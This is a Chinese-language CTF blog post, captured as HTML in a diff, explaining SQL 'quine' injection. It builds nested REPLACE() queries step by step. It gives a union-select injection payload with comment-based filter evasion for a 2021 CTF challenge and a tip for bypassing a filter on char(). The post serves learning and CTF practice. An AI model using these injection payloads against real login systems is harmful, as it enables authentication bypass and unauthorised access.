@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Quine注入详解 | Lunatic&#39;s Workstation</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="最近做到一道题，需要用到Quine注入，感觉不太好理解，于是打算写一篇博客详细记录一下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Quine注入详解">
+<meta property="og:url" content="https://goodlunatic.github.io/2023/07/04/Uquine%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:site_name" content="Lunatic&#39;s Workstation">
+<meta property="og:description" content="最近做到一道题，需要用到Quine注入，感觉不太好理解，于是打算写一篇博客详细记录一下。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-07-04T07:00:55.000Z">
+<meta property="article:modified_time" content="2023-07-04T11:49:43.438Z">
+<meta property="article:author" content="Lunatic">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Lunatic&#39;s Workstation" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Lunatic&#39;s Workstation</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about">About</a>
+        
+          <a class="main-nav-link" href="/Friends">Friends</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://goodlunatic.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Uquine注入详解" class="article article-type-post" itemscope
+  itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/07/04/Uquine%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/" class="article-date">
+  <time datetime="2023-07-04T07:00:55.000Z" itemprop="datePublished">2023-07-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+    <header class="article-header">
+      
+  
+    <h1 class="article-title" itemprop="name">
+      Quine注入详解
+    </h1>
+  
+
+    </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      <div class="toc-parent">
+  <div id="toc" class="toc-article">
+    <div class="toc-title">目录</div>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Quine%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3"><span class="toc-text">Quine注入详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%A6%96%E5%85%88%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8Breplace-%E5%87%BD%E6%95%B0"><span class="toc-text">一、首先了解一下replace()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-text">语法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%BC%80%E5%A7%8B%E4%BB%8B%E7%BB%8DQuine%E6%B3%A8%E5%85%A5"><span class="toc-text">二、开始介绍Quine注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">三、总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84Quine"><span class="toc-text">其他数据库中的Quine</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%BE%8B%E9%A2%98"><span class="toc-text">四、例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2021-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-yet-another-mysql-injection%EF%BC%88quine%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-text">1.2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%812023-HDCTF-Yamiyami"><span class="toc-text">2、2023-HDCTF-Yamiyami</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%89%A9%E5%B1%95"><span class="toc-text">五、扩展</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li></ol>
+  </div>
+</div>
+      <p><strong>最近做到一道题，需要用到Quine注入，感觉不太好理解，于是打算写一篇博客详细记录一下。</strong></p>
+<span id="more"></span>
+
+<h1 id="Quine注入详解"><a href="#Quine注入详解" class="headerlink" title="Quine注入详解"></a>Quine注入详解</h1><p>在<code>sql</code>注入技术中，Quine是一种使得输入的<code>sql</code>语句和输出的<code>sql</code>语句一致的技术。</p>
+<p>Quine注入主要用到的是replace()函数。</p>
+<h2 id="一、首先了解一下replace-函数"><a href="#一、首先了解一下replace-函数" class="headerlink" title="一、首先了解一下replace()函数"></a>一、首先了解一下replace()函数</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(string_expression , string_pattern , string_replacement)</span><br><span class="line">#string_expression是待处理的字符串表达式(字符或二进制数据)</span><br><span class="line">#string_pattern是要查找的子字符串(字符或二进制数据，但是不能为空)</span><br><span class="line">#string_replacement是用来替换的字符串(字符或二进制数据)</span><br></pre></td></tr></table></figure>
+
+<p>Tips：在标准SQL中，字符串使用的是单引号</p>
+<p>​            如果字符串本身包含单引号，则要使用两个单引号，但是字符串中的双引号不需要另外转义</p>
+<h2 id="二、开始介绍Quine注入"><a href="#二、开始介绍Quine注入" class="headerlink" title="二、开始介绍Quine注入"></a>二、开始介绍Quine注入</h2><p>Quine的基本形式：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(str,编码的间隔符,str)</span><br></pre></td></tr></table></figure>
+
+<p>参数str的基本形式：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(间隔符,编码的间隔符,间隔符)</span><br></pre></td></tr></table></figure>
+
+<p>首先先看这样一个例子</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;);# <span class="type">char</span>(<span class="number">46</span>)就是.</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+---------------------------+</span><br><span class="line">| replace(&quot;.&quot;,char(46),&quot;.&quot;) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| .                         |</span><br><span class="line">+---------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>该语句将待处理字符串中的”.”替换为”.”，然后输入了替换后的结果</p>
+<p>那如果我们把待处理的字符串改为’select replace(“.”,char(46),”.”)’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(<span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+---------------------------------------------------+</span><br><span class="line">| replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&quot;.&quot;) |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| replace(&quot;.&quot;,char(46),&quot;.&quot;)                         |</span><br><span class="line">+---------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>我们就会得到以上的结果，语句把’select replace(“.”,char(46),”.”)’当成 了一个字符串进行处理</p>
+<p>倘若我们更近一步，把用来替换的字符串也改为’replace(“.”,char(46),”.”)’，</p>
+<p>即 str：replace(“间隔符”,编码的间隔符,”间隔符”)</p>
+<p>这里<code>str</code>中的间隔符号用双引号包裹是因为<code>str</code>已经被单引号包裹，</p>
+<p>为避免引号匹配问题引入新的转义符号，间隔符需要使用双引号</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(<span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;) |</span><br><span class="line">+---------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>这个时候我们发现，输出的内容和我们输入的内容已经有点类似了，就剩下了四个单/双引号上的区别</p>
+<p>为了让输出的内容和输入完全相同，我们还要想办法把这四个引号给替换了，就是里面再套个replace()</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#此时Quine的形式</span><br><span class="line">REPLACE(REPLACE(<span class="string">&#x27;str&#x27;</span>,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),编码的间隔符,<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line">#此时str的形式</span><br><span class="line">REPLACE(REPLACE(&quot;间隔符&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),编码的间隔符,&quot;间隔符&quot;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(replace(<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>整个一起看肯定不好看，我们拆出来一个个进行分析</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------------------------------------------------------------+</span><br><span class="line">| replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)) |</span><br><span class="line">+-----------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;.&#x27;,char(34),char(39)),char(46),&#x27;.&#x27;)                              |</span><br><span class="line">+-----------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>即第一层运行可以得到</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(<span class="string">&#x27;replace(replace(&#x27;</span>.<span class="string">&#x27;,char(34),char(39)),char(46),&#x27;</span>.<span class="string">&#x27;)&#x27;</span>,<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>因为此时字符串本身也包含单引号，所以要用单引号来对内层的单引号进行转义</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(<span class="string">&#x27;replace(replace(&#x27;&#x27;.&#x27;&#x27;,char(34),char(39)),char(46),&#x27;&#x27;.&#x27;&#x27;)&#x27;</span>,<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>运行第二层可以得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(&#x27;replace(replace(&#x27;&#x27;.&#x27;&#x27;,char(34),char(39)),char(46),&#x27;&#x27;.&#x27;&#x27;)&#x27;,char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;)                        |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>至此，我们大致就了解了Quine注入的原理</p>
+<p>Tips：如果char被过滤了，可以使用chr和0x绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char(34),char(39)</span><br><span class="line">chr(34),chr(39)</span><br><span class="line">0x22,0x27</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Quine的基本形式：</span><br><span class="line">1&#x27;/**/union/**/select/**/replace(replace(&#x27;&#x27;,char(34),char(39)),char(46),&#x27;&#x27;)#</span><br><span class="line">str的基本形式：</span><br><span class="line">1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他数据库中的Quine"><a href="#其他数据库中的Quine" class="headerlink" title="其他数据库中的Quine"></a>其他数据库中的Quine</h3><p><strong>SQL Server</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT Replace(Replace(</span><br><span class="line">&#x27;SELECT REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) AS Quine&#x27;,</span><br><span class="line">Char(34), Char(39)), Char(36),</span><br><span class="line">&#x27;SELECT REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) AS Quine&#x27;)</span><br><span class="line">AS Quine</span><br><span class="line"></span><br><span class="line">DECLARE @ CHAR(65)=&#x27;DECLARE @ CHAR(65)=#PRINT REPLACE(@,CHAR(35),CHAR(39)+@+CHAR(39))&#x27;PRINT REPLACE(@,CHAR(35),CHAR(39)+@+CHAR(39))</span><br></pre></td></tr></table></figure>
+
+<p><strong>Oracle</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SELECT Replace(Replace(</span><br><span class="line">&#x27;SELECT REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) AS Quine&#x27;,</span><br><span class="line">Char(34), Char(39)), Char(36),</span><br><span class="line">&#x27;SELECT REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;) AS Quine&#x27;)</span><br><span class="line">AS Quine</span><br><span class="line"></span><br><span class="line">select</span><br><span class="line">substr(rpad(1,125,&#x27;||chr(39)),26)from dual;select</span><br><span class="line">substr(rpad(1,125,&#x27;||chr(39)),26)from dual;</span><br></pre></td></tr></table></figure>
+
+<p><strong>PostgreSQL</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT left(A.v, 81) || chr(39) || A.v || chr(39) || right(A.v, 12) FROM (SELECT &#x27;SELECT left(A.v, 81) || chr(39) || A.v || chr(39) || right(A.v, 12) FROM (SELECT AS v) AS A;&#x27; AS v) AS A;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Snowflake</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT CURRENT_STATEMENT();</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、例题"><a href="#四、例题" class="headerlink" title="四、例题"></a>四、例题</h2><h3 id="1-2021-第五空间智能安全大赛-Web-yet-another-mysql-injection（quine注入）"><a href="#1-2021-第五空间智能安全大赛-Web-yet-another-mysql-injection（quine注入）" class="headerlink" title="1.2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入）"></a>1.2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入）</h3><p><strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/replace(replace(&#x27;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、2023-HDCTF-Yamiyami"><a href="#2、2023-HDCTF-Yamiyami" class="headerlink" title="2、2023-HDCTF-Yamiyami"></a>2、2023-HDCTF-Yamiyami</h3><p><strong>payload和上题相同</strong></p>
+<h2 id="五、扩展"><a href="#五、扩展" class="headerlink" title="五、扩展"></a>五、扩展</h2><p><strong>Python3中Quine的例子</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;a = &#123;&#125;&#123;&#125;&#123;&#125;; print(a.format(chr(39), a, chr(39)))&#x27;</span>; <span class="built_in">print</span>(a.<span class="built_in">format</span>(<span class="built_in">chr</span>(<span class="number">39</span>), a, <span class="built_in">chr</span>(<span class="number">39</span>)))</span><br><span class="line"><span class="comment">#%r是一个万能的格式付，它会将后面给的参数原样打印出来，带有类型信息</span></span><br><span class="line">c = <span class="string">&#x27;c = %r; print(c %% c)&#x27;</span>; <span class="built_in">print</span>(c % c)</span><br><span class="line"><span class="built_in">exec</span>(s:=<span class="string">&#x27;print(&quot;exec(s:=%r)&quot;%s)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhengna/p/15917521.html">CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入） - zhengna - 博客园 (cnblogs.com)</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://goodlunatic.github.io/2023/07/04/Uquine%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/" data-id="cljo8a69e002cow3z00urcp2a" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+
+    </footer>
+  </div>
+  
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2023/07/04/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CTF——Web学习记录【长期更新】</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ACM/">ACM</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/BlockChain/">BlockChain</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Courses/">Courses</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Database/">Database</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Hexo/">Hexo</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Language/">Language</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Raspberry-Pi/">Raspberry-Pi</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Skills/">Skills</a><span class="category-list-count">12</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUp/">WriteUp</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/">年终总结</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ACM/" style="font-size: 10px;">ACM</a> <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 18px;">CTF</a> <a href="/tags/Courses/" style="font-size: 14px;">Courses</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Git/" style="font-size: 10px;">Git</a> <a href="/tags/Hexo/" style="font-size: 12px;">Hexo</a> <a href="/tags/Java/" style="font-size: 10px;">Java</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/Leetcode/" style="font-size: 10px;">Leetcode</a> <a href="/tags/Misc/" style="font-size: 16px;">Misc</a> <a href="/tags/Mysql/" style="font-size: 10px;">Mysql</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/Program/" style="font-size: 10px;">Program</a> <a href="/tags/Pwn/" style="font-size: 12px;">Pwn</a> <a href="/tags/Python/" style="font-size: 12px;">Python</a> <a href="/tags/Raspberry-Pi/" style="font-size: 10px;">Raspberry-Pi</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/Skills/" style="font-size: 20px;">Skills</a> <a href="/tags/Web/" style="font-size: 16px;">Web</a> <a href="/tags/WriteUp/" style="font-size: 10px;">WriteUp</a> <a href="/tags/forensics/" style="font-size: 10px;">forensics</a> <a href="/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" style="font-size: 10px;">年终总结</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/07/04/Uquine%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/">Quine注入详解</a>
+          </li>
+        
+          <li>
+            <a href="/2023/07/04/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/">CTF——Web学习记录【长期更新】</a>
+          </li>
+        
+          <li>
